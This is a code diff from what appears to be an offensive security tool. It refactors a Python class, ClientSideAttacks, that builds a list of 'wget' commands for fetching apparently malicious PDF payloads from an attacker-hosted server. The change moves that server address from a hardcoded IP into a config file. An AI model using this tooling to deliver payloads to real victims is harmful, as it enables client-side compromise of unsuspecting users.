@@ -5,14 +5,20 @@ All files are shipped in the ./pdf/ directory
 Install all files on a remote server, running a web server
 and specify the path in self._remoteURL variable
 """
+
+import ConfigParser
+
 class ClientSideAttacks():
     def __init__(self, target):
-        self.payloads = []
+        # Read configuration
+        self.config = ConfigParser.RawConfigParser()
+        self.config.read('config.cfg')
+
         self._target = target
-        self._remoteURL = "http://192.168.100.45/pdf" # Don't put trailing slash at the end!
+        self.payloads = []
 
     def getPayloads(self):
-
+        
         files = [
         '001e2710555613a82e94156d3ed9c289',
         '7b9e1c1b479447506cc046a5d8219eca',
@@ -275,7 +281,7 @@ class ClientSideAttacks():
         for file in files:
             self.payloads.append([
                 '%s' % file,
-                'wget %s/%s' % (self._remoteURL, file)
+                'wget %s/%s' % (self.config.get('PATHS', 'remotews'), file)
             ])
 
         return self.payloads
